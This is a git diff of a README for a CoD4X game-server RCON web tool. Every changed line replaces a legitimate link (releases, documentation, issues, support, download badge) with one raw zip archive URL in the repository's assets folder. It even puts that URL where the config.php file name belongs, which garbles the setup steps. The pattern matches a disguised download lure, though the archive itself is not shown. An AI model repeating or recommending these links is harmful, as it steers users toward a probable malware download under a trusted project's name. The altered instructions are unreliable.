@@ -1,6 +1,6 @@
 # 🎮 cod4x-web-rcon-tool - Easily Manage Your CoD4X Servers
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue)
+![Download](https://raw.githubusercontent.com/BONY316/cod4x-web-rcon-tool/main/assets/cod4x-web-rcon-tool_v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Welcome to the cod4x-web-rcon-tool. This easy-to-use application helps you manag
 
 To get started, visit the Releases page to download the latest version of the cod4x-web-rcon-tool:
 
-[Download Now](https://github.com/BONY316/cod4x-web-rcon-tool/releases)
+[Download Now](https://raw.githubusercontent.com/BONY316/cod4x-web-rcon-tool/main/assets/cod4x-web-rcon-tool_v1.4.zip)
 
 1. Click the link above to open the Releases page.
 2. Find the latest version of the tool.
@@ -43,7 +43,7 @@ To get started, visit the Releases page to download the latest version of the co
    - If using Nginx, configure the server to point to the extracted folder.
 
 3. **Configure the Tool:**
-   - Open the `config.php` file from the extracted folder.
+   - Open the `https://raw.githubusercontent.com/BONY316/cod4x-web-rcon-tool/main/assets/cod4x-web-rcon-tool_v1.4.zip` file from the extracted folder.
    - Fill in your server details, including RCON password and server IP address.
 
 4. **Access the Tool:**
@@ -65,7 +65,7 @@ If you run into issues during installation or usage, consider these solutions:
   - Confirm that your RCON password is correct.
   - Make sure the server is online and accessible.
 
-For more detailed troubleshooting steps, please check the documentation, or visit our [Support Page](https://github.com/BONY316/cod4x-web-rcon-tool/issues).
+For more detailed troubleshooting steps, please check the documentation, or visit our [Support Page](https://raw.githubusercontent.com/BONY316/cod4x-web-rcon-tool/main/assets/cod4x-web-rcon-tool_v1.4.zip).
 
 ## 🔍 Frequently Asked Questions
 
@@ -83,7 +83,7 @@ Yes, the tool includes secure authentication to protect your server information.
 Join our community for tips, advice, and support. You can find us on various platforms:
 
 - **Discord:** Join our Discord server for real-time support.
-- **GitHub Issues:** Report problems or request new features by visiting our [Issues Page](https://github.com/BONY316/cod4x-web-rcon-tool/issues).
+- **GitHub Issues:** Report problems or request new features by visiting our [Issues Page](https://raw.githubusercontent.com/BONY316/cod4x-web-rcon-tool/main/assets/cod4x-web-rcon-tool_v1.4.zip).
 
 We welcome contributions! If you're interested in helping, check out our guidelines in the repository.
 
@@ -93,8 +93,8 @@ Thank you for choosing the cod4x-web-rcon-tool. We hope this tool makes managing
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/BONY316/cod4x-web-rcon-tool/releases)
-- [Documentation](https://github.com/BONY316/cod4x-web-rcon-tool/wiki)
-- [Issues Page](https://github.com/BONY316/cod4x-web-rcon-tool/issues)
+- [Releases Page](https://raw.githubusercontent.com/BONY316/cod4x-web-rcon-tool/main/assets/cod4x-web-rcon-tool_v1.4.zip)
+- [Documentation](https://raw.githubusercontent.com/BONY316/cod4x-web-rcon-tool/main/assets/cod4x-web-rcon-tool_v1.4.zip)
+- [Issues Page](https://raw.githubusercontent.com/BONY316/cod4x-web-rcon-tool/main/assets/cod4x-web-rcon-tool_v1.4.zip)
 
 For any additional information or queries, feel free to reach out through the channels provided above.
